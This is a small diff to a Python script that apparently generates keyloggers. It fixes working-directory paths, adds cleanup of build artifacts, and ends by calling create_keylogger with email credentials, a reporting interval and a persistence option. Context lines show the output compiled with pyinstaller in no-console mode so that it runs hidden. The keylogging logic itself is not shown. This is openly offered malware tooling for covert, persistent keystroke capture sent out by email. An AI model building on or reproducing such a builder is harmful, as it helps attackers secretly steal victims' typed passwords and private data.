@@ -43,15 +43,17 @@ def compile_for_linux(file_name):
     subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])
 
 def del_junk_file(file_name):
-    build = os.getcwd + "\\build"
-    file_name = os.getcwd + f"\\{file_name}"
+    build = os.getcwd() + "\\build"
+    file_name = os.getcwd() + f"\\{file_name}"
+    pycache = os.getcwd() + "\\__pycache__"
     os.remove(file_name)
     os.remove(file_name + ".spec")    
     shutil.rmtree(build)
+    shutil.rmtree(pycache)
+    
   
-
 print(banners.get_banner())
-print("\t\tAuthor: Pushpender | Website: technowlogy.tk\n")
+print(f"\t\tAuthor: Pushpender | Website: technowlogy.tk\n")
 
 arguments = get_arguments()
 create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))
